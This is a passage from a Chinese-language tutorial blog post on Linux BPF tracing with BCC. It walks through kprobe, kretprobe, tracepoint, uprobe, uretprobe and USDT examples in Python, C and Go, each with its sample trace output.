class="number">4</span></span><br></pre></td></tr></table></figure><p>1：BPF程序开始执行，辅助函数<code>bpf_get_current_comm</code>将获取内核正在运行的当前命令的名称，并将其存储在我们的<code>comm</code>变量中。我们将其定义为固定长度数组，因为内核对命令名称有16个字符的限制。获得命令名称后，我们将其打印在调试跟踪中，这样运行Python脚本的人就可以看到BPF捕获的所有命令。</p><p>2：加载BPF程序到内核中</p><p>3：将程序与<code>execve</code>系统调用相关联。这个系统调用的名称在不同的内核版本中发生了变化，并且BCC提供了一个函数来检索这个名称，而无需记住你正在运行的内核版本。</p><p>4：该代码输出跟踪日志，因此你可以看到使用该程序跟踪的所有命令。</p><p>执行结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# python3 kprobes.py </span><br><span class="line">b'     barad_agent-1950607 [000] d..31 829823.592341: bpf_trace_printk: executing program: barad_agent'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950610 [000] d..31 829823.594794: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950609 [000] d..31 829823.595494: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950608 [000] d..31 829823.597752: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'     barad_agent-1950614 [000] d..31 829826.591153: bpf_trace_printk: executing program: barad_agent'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950614 [000] d..31 829826.592741: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'     barad_agent-1950615 [000] d..31 829826.594348: bpf_trace_printk: executing program: barad_agent'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950617 [000] d..31 829826.595978: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1950616 [000] d..31 829826.597514: bpf_trace_printk: executing program: sh'</span><br><span class="line">b''</span><br><span class="line">b'     barad_agent-1950620 [000] d..31 829827.593496: bpf_trace_printk: executing program: barad_agent''</span><br></pre></td></tr></table></figure><h4 id="Kretprobes"><a href="#Kretprobes" class="headerlink" title="Kretprobes"></a>Kretprobes</h4><p>当内核指令在执行后返回一个值时，<code>Kretprobes</code>将插入你的BPF程序。通常，你会希望将<code>kprobes</code>和<code>kretrobes</code>组合到一个BPF程序中，以便全面了解指令的行为。</p><p>我们将使用与上一节中的示例类似的示例来展示<code>kretprobes</code>的工作原理：</p><p><code>kretprobes.py</code>代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">int ret_sys_execve(struct pt_regs *ctx) &#123;1</span></span><br><span class="line"><span class="string">  int return_value;</span></span><br><span class="line"><span class="string">  char comm[16];</span></span><br><span class="line"><span class="string">  bpf_get_current_comm(&amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  return_value = PT_REGS_RC(ctx);</span></span><br><span class="line"><span class="string">  bpf_trace_printk("program: %s, return: %d\\n", comm, return_value);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text=bpf_source)<span class="number">2</span></span><br><span class="line">execve_function = bpf.get_syscall_fnname(<span class="string">"execve"</span>)</span><br><span class="line">bpf.attach_kretprobe(event=execve_function, fn_name=<span class="string">"ret_sys_execve"</span>)<span class="number">3</span></span><br><span class="line">bpf.trace_print()</span><br></pre></td></tr></table></figure><p>1：定义实现BPF程序的函数。 内核将在<code>execve</code>系统调用完成后立即执行它。 <code>PT_REGS_RC</code>是一个宏，它将从BPF寄存器中读取此特定上下文的返回值。我们还使用<code>bpf_trace_printk</code>在调试日志中打印命令及其返回值</p><p>2：初始化BPF程序并将其加载到内核中</p><p>3：将附着函数更改为<code>attach_kretprobe</code></p><p>执行结果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# python3 kretprobes.py </span><br><span class="line">b'              sh-1953793 [000] dN.31 831223.599284: bpf_trace_printk: program: sh, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'             awk-1953796 [000] dN.31 831223.601352: bpf_trace_printk: program: awk, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'            grep-1953795 [000] dN.31 831223.602648: bpf_trace_printk: program: grep, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'             cat-1953794 [000] dN.31 831223.604214: bpf_trace_printk: program: cat, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1953798 [000] d..31 831226.598533: bpf_trace_printk: program: sh, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'             cat-1953798 [000] d..31 831226.599918: bpf_trace_printk: program: cat, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'              sh-1953799 [000] dN.31 831226.601655: bpf_trace_printk: program: sh, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'             awk-1953801 [000] dN.31 831226.603102: bpf_trace_printk: program: awk, return: 0'</span><br><span class="line">b''</span><br><span class="line">b'             cat-1953800 [000] dN.31 831226.604683: bpf_trace_printk: program: cat, return: 0'</span><br></pre></td></tr></table></figure><p>内核探针是访问内核的一种强大方法。但正如我们之前提到的，它们可能不太稳定，因为你附着到内核源代码中的动态点，这些动态点可能会从一个版本更改或消失到另一个版本。因此我们需要一种更安全的将程序附着到内核的方法。</p><h3 id="Tracepoints"><a href="#Tracepoints" class="headerlink" title="Tracepoints"></a>Tracepoints</h3><p>跟踪点是内核代码中的静态标记，可用于将代码附着到正在运行的内核中。与<code>kprobe</code>的主要区别在于，它们是由内核开发人员在实现内核更改时编写的；这就是为什么我们将它们称为静态的。因为它们是静态的，所以跟踪点的ABI更稳定；内核始终保证旧版本中的跟踪点将存在于新版本中。但是，鉴于开发人员需要将它们添加到内核中，它们可能不会涵盖构成内核的所有子系统。</p><p>正如我们在之前提到的，你可以通过列出<code>/sys/kernel/debug/tracing/events</code>中的所有文件来查看系统中所有可用的跟踪点。</p><p>该输出中列出的每个子目录都对应一个跟踪点，我们可以将BPF程序附着到该跟踪点。但是那里还有两个附加文件。<code>enable</code>文件允许你启用和禁用BPF子系统的所有跟踪点。 如果文件内容为0，则禁用跟踪点；如果文件的内容为1，则启用跟踪点。<code>filter</code>文件允许你编写内核中的Trace子系统将用于过滤事件的表达式。</p><p>编写BPF程序利用跟踪点类似于使用<code>kprobes</code>进行跟踪。 这是一个使用BPF程序来跟踪系统中加载其他BPF程序的所有应用程序的示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">int trace_bpf_prog_load(void ctx) &#123;1</span></span><br><span class="line"><span class="string">  char comm[16];</span></span><br><span class="line"><span class="string">  bpf_get_current_comm(&amp;comm, sizeof(comm));</span></span><br><span class="line"><span class="string">  bpf_trace_printk("%s is loading a BPF program", comm);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text = bpf_source)</span><br><span class="line">bpf.attach_tracepoint(tp = <span class="string">"bpf:bpf_prog_load"</span>, fn_name = <span class="string">"trace_bpf_prog_load"</span>)<span class="number">2</span></span><br><span class="line">bpf.trace_print()</span><br></pre></td></tr></table></figure><p>1：声明定义BPF程序的函数</p><p>2：该程序的主要区别在于：我们不是将程序附着到<code>kprobe</code>，而是将其附着到跟踪点。 BCC遵循命名跟踪点的约定； 首先，需要指定要跟踪的子系统（在本例中为bpf），后跟一个冒号，然后是子系统中的跟踪点 <code>pbf_prog_load</code>。 这意味着每次内核执行函数<code>bpf_prog_load</code>时，这个程序都会接收到事件，并打印出正在执行 <code>bpf_prog_load</code>指令的应用程序的名称。</p><p>内核探针和跟踪点使你能够完全访问内核。我们建议你尽可能使用跟踪点，但不要仅仅因为跟踪点更安全而坚持使用跟踪点。利用内核探针的动态特性。在下一节中，我们将讨论如何在用户空间运行的程序中获得类似级别的可见性。</p><h3 id="User-Space-Probes"><a href="#User-Space-Probes" class="headerlink" title="User-Space Probes"></a>User-Space Probes</h3><p>用户空间探针允许你在用户空间运行的程序中设置动态标志。它们相当于内核探针，用于检测在内核外运行的程序。当你定义一个<code>uprobe</code>时，内核会在附加的指令周围创建一个陷阱。 当你的应用程序到达该指令时，内核会触发一个事件，该事件将你的探测函数作为回调函数。<code>Uprobes</code>还允许你访问程序链接到的任何库，如果你知道指令的正确名称，就可以跟踪这些调用。</p><p>像内核探针一样，用户空间探针也分为两类，<code>uprobes</code>和<code>uretprobes</code>，这取决于你在程序执行周期中插入BPF程序的位置。 让我们直接看一些例子。</p><h4 id="uprobes"><a href="#uprobes" class="headerlink" title="uprobes"></a>uprobes</h4><p>一般来说，<code>uprobes</code>是内核在执行特定指令之前插入到程序指令集中的钩子。将<code>uprobes</code>附加到同一程序的不同版本时需要小心，因为函数签名可能会在这些版本之间内部发生变化。保证BPF程序在两个不同版本中运行的唯一方法是确保签名没有更改。你可以在Linux中使用命令<code>nm</code>列出ELF目标文件中包含的所有符号，这是检查你正在跟踪的指令是否仍然存在程序中的好办法，例如：</p><p><code>main.go</code>程序如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>  &#123;</span><br><span class="line">    fmt.Println(<span class="string">"Hello, BPF"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着使用<code>go build -o hello-bpf main.go</code>编译这个Go程序。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# go build -o hello-bpf main.go</span><br></pre></td></tr></table></figure><p>最后使用命令<code>nm</code>获取有关二进制文件包含的所有指令点的信息。<code>nm</code>是GNU开发工具中包含的一个程序，它列出了目标文件中的符号。 如果你过滤名称中带有<code>main</code>的符号，会得到一个类似如下的列表：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# nm hello-bpf | grep main</span><br><span class="line">0000000000535ec0 D main..inittask</span><br><span class="line">0000000000497640 T main.main</span><br><span class="line">0000000000434d20 T runtime.main</span><br><span class="line">000000000045e440 T runtime.main.func1</span><br><span class="line">000000000045e4a0 T runtime.main.func2</span><br><span class="line">000000000054ab50 B runtime.main_init_done</span><br><span class="line">00000000004d8828 R runtime.mainPC</span><br><span class="line">0000000000578210 B runtime.mainStarted</span><br></pre></td></tr></table></figure><p>现在你有了一个符号列表，可以跟踪它们何时执行，甚至在执行相同二进制文件的不同进程之间。</p><p>为了跟踪我们之前的 Go 示例中的 main 函数何时执行，我们将编写一个 BPF 程序，并将其附加到一个 uprobe，该 uprobe 将在任何进程调用该指令之前中断：</p><p><code>uprobes.py</code>程序如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">int trace_go_main(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  bpf_trace_printk("New hello-bpf process running with PID: %d\\n", pid);1</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text = bpf_source)</span><br><span class="line">bpf.attach_uprobe(name = <span class="string">"./hello-bpf"</span>, sym = <span class="string">"main.main"</span>, fn_name = <span class="string">"trace_go_main"</span>)<span class="number">2</span></span><br><span class="line">bpf.trace_print()</span><br></pre></td></tr></table></figure><p>1：使用函数<code>bpf_get_current_pid_tgid</code>来获取运行我们的<code>hello-bpf</code>程序的进程的进程标识符 (PID)。</p><p>2：将此程序附着到<code>uprobe</code>。 这个调用需要知道我们要跟踪的对象<code>hello-bpf</code>是对象文件的绝对路径。它还需要我们在对象内部跟踪的符号，在本例中为<code>main.main</code>，以及我们要运行的BPF程序。 这样，每当有人在我们的系统中运行<code>hello-bpf</code>时，我们都会在跟踪管道中获得一个新日志。</p><p>首先执行<code>hello-bpf</code>程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br></pre></td></tr></table></figure><p>接着查看<code>uprobes.py</code>程序的输出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# python3 uprobes.py </span><br><span class="line">b'       hello-bpf-1977813 [000] d..31 841378.451282: bpf_trace_printk: New hello-bpf process running with PID: 1977813'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1977821 [000] d..31 841383.099817: bpf_trace_printk: New hello-bpf process running with PID: 1977821'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1977829 [000] d..31 841384.195796: bpf_trace_printk: New hello-bpf process running with PID: 1977829'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1977833 [000] d..31 841384.907406: bpf_trace_printk: New hello-bpf process running with PID: 1977833'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1977836 [000] d..31 841385.280290: bpf_trace_printk: New hello-bpf process running with PID: 1977836'</span><br></pre></td></tr></table></figure><h4 id="Uretprobes"><a href="#Uretprobes" class="headerlink" title="Uretprobes"></a>Uretprobes</h4><p><code>Uretprobes</code>是<code>kretprobes</code>的并行探针，但用于用户空间程序。它们将BPF程序附着到返回值的指令上，并让你通过访问BPF代码中的寄存器来访问这些返回值。</p><p>结合<code>uprobes</code>和<code>uretprobes</code>可以让你编写更复杂的BPF程序。 它们可以让你更全面地了解系统中运行的应用程序。当你可以在函数运行之前和完成后立即注入跟踪代码时，可以开始收集更多数据并测量应用程序行为。一个常见的用例是测量一个函数执行需要多长时间，而无需更改应用程序中的一行代码。</p><p><code>uretprobes.py</code>程序如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">BPF_HASH(cache, u64, u64);</span></span><br><span class="line"><span class="string">int trace_start_time(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  u64 start_time_ns = bpf_ktime_get_ns();</span></span><br><span class="line"><span class="string">  cache.update(&amp;pid, &amp;start_time_ns);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf_source += <span class="string">"""</span></span><br><span class="line"><span class="string">int print_duration(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  u64 *start_time_ns = cache.lookup(&amp;pid);</span></span><br><span class="line"><span class="string">  if (start_time_ns == 0) &#123;</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  u64 duration_ns = bpf_ktime_get_ns() - *start_time_ns;</span></span><br><span class="line"><span class="string">  bpf_trace_printk("Function call duration: %d\\n", duration_ns);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text = bpf_source)</span><br><span class="line">bpf.attach_uprobe(name = <span class="string">"./hello-bpf"</span>, sym = <span class="string">"main.main"</span>, fn_name = <span class="string">"trace_start_time"</span>)</span><br><span class="line">bpf.attach_uretprobe(name = <span class="string">"./hello-bpf"</span>, sym = <span class="string">"main.main"</span>, fn_name = <span class="string">"print_duration"</span>)</span><br><span class="line">bpf.trace_print()</span><br></pre></td></tr></table></figure><p>首先执行<code>hello-bpf</code>程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br></pre></td></tr></table></figure><p>接着查看<code>uprobes.py</code>程序的输出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# python3 uprobes.py </span><br><span class="line">b'       hello-bpf-1980788 [000] d..31 842673.650139: bpf_trace_printk: Function call duration: 73230'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1980801 [000] d..31 842677.296529: bpf_trace_printk: Function call duration: 307682'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1980810 [000] d..31 842678.797365: bpf_trace_printk: Function call duration: 85177'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1980814 [000] d..31 842680.214506: bpf_trace_printk: Function call duration: 330715'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1980818 [000] d..31 842681.247549: bpf_trace_printk: Function call duration: 70589'</span><br></pre></td></tr></table></figure><h4 id="User-Statically-Defined-Tracepoints"><a href="#User-Statically-Defined-Tracepoints" class="headerlink" title="User Statically Defined Tracepoints"></a>User Statically Defined Tracepoints</h4><p>用户静态定义的跟踪点(USDT)为用户空间中的应用程序提供静态跟踪点。这是一种检测应用程序的便捷方式，因为它们提供了BPF提供的跟踪功能的低开销入口点。你还可以将它们用作在生产中跟踪应用程序的约定，而不管这些应用程序是使用何种编程语言编写的。</p><p>USDT由DTrace推广，DTrace最初由Sun Microsystems开发，用于Unix系统的动态检测。 由于许可问题，DTrace直到最近才在Linux中可用；但是，Linux内核开发人员从DTrace的原始工作中获得了很多灵感来实现USDT。</p><p>就像之前看到的静态内核跟踪点一样，USDT要求开发人员使用指令来检测他们的代码，内核将使用这些指令作为陷阱来执行BPF程序。 USDT的<code>Hello World</code>版本只有几行代码：</p><p><code>hello_usdt.c</code>程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sdt.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">DTRACE_PROBE(<span class="string">"hello-usdt"</span>, <span class="string">"probe-main"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，我们使用Linux提供的宏来定义我们的第一个USDT。<code>DTRACE_PROBE</code>将注册内核将用于注入BPF函数回调的跟踪点。该宏中的第一个参数是报告跟踪的程序。第二个是我们报告跟踪的名称。</p><p>安装在系统中的许多应用程序都可能使用这种类型的探针，以便以一种可预测的方式访问运行时跟踪数据。例如，数据库MySQL使用静态定义的跟踪点公开各种信息。你可以从服务器中执行的查询以及许多其他用户操作中收集信息。<code>Node.js</code>是构建在<code>Chrome V8</code>引擎上的JavaScript运行时，同样提供了可用于提取运行时信息的跟踪点。</p><p>在展示如何将BPF程序附着到用户定义的跟踪点之前，我们需要先谈谈可发现性。因为这些跟踪点是在可执行文件中以二进制格式定义的，所以我们需要一种方法来列出程序定义的探针，而无需深入研究源代码。提取此信息的一种方法是直接读取ELF二进制文件。首先，我们将编译我们之前的Hello World USDT示例； 我们可以为此使用 GCC：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o hello_usdt hello_usdt.c</span><br></pre></td></tr></table></figure><p>编译报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hello_usdt.c:1:10: fatal error: sys/sdt.h: No such file or directory</span><br><span class="line"><span class="meta"> #</span><span class="bash">include &lt;sys/sdt.h&gt;</span></span><br><span class="line">          ^~~~~~~~~~~</span><br><span class="line">compilation terminated.</span><br></pre></td></tr></table></figure><p>报错解决如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# yum install systemtap-sdt-devel</span><br></pre></td></tr></table></figure><p>上述<code>gcc</code>命令将生成一个名为<code>hello_usdt</code>的二进制文件，我们可以使用该文件开始使用多个工具来发现它定义的跟踪点。 Linux提供了一个名为<code>readelf</code>的实用程序来显示有关ELF文件的信息。 你可以将它与我们编译的示例一起使用，<code>readelf</code>可以提供有关二进制文件的大量信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# readelf -n ./hello_usdt</span><br><span class="line">Displaying notes found in: .note.stapsdt</span><br><span class="line">  Owner                 Data sizeDescription</span><br><span class="line">  stapsdt              0x00000033NT_STAPSDT (SystemTap probe descriptors)</span><br><span class="line">    Provider: "hello-usdt"</span><br><span class="line">    Name: "probe-main"</span><br></pre></td></tr></table></figure><p>发现二进制文件中定义的跟踪点的更好选择是使用BCC的<code>tplist</code>工具，该工具可以显示内核跟踪点和USDT。这个工具的优点是它的输出简单；仅显示跟踪点定义，而没有关于可执行文件的任何其他信息。用法类似于<code>readelf</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# /usr/share/bcc/tools/tplist -l ./hello_usdt</span><br><span class="line">b'./hello_usdt' b'"hello-usdt"':b'"probe-main"'</span><br></pre></td></tr></table></figure><p>它列出了你在单独的行中定义的每个跟踪点。在我们的示例中，它仅显示一行带有我们的<code>probe-main</code>定义：</p><p>在你知道二进制文件中支持的跟踪点之后，你可以将BPF程序附着到它们上，就像你在前面的例子中看到的那样：</p><p><code>usdt.py</code>程序如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF, USDT</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">int trace_binary_exec(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  bpf_trace_printk("New hello_usdt process running with PID: %d\\n", pid);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">usdt = USDT(path = <span class="string">"./hello_usdt"</span>)<span class="number">1</span></span><br><span class="line">usdt.enable_probe(probe = <span class="string">"probe-main"</span>, fn_name = <span class="string">"trace_binary_exec"</span>)<span class="number">2</span></span><br><span class="line">bpf = BPF(text = bpf_source, usdt_contexts = [usdt])<span class="number">3</span></span><br><span class="line">bpf.trace_print()</span><br></pre></td></tr></table></figure><p>1：创建一个USDT对象； USDT不是BPF的一部分，因为你可以在无需与BPF虚拟机交互的情况下使用它们。因为它们彼此独立，所以它们的使用独立于BPF代码。</p><p>2：附着BPF函数以跟踪程序执行到我们应用程序中的探针</p><p>3：使用刚刚创建的跟踪点定义初始化BPF环境。 这将通知BCC需要生成代码来连接我们的BPF程序和二进制文件中的探针定义。当它们都连接时，我们可以打印BPF程序生成的跟踪，以发现二进制示例中最新的执行。</p><h3 id="可视化跟踪数据"><a href="#可视化跟踪数据" class="headerlink" title="可视化跟踪数据"></a>可视化跟踪数据</h3><p>到目前为止，我们已经展示了在调试输出中打印数据的示例。这在生产环境中不是很有用。 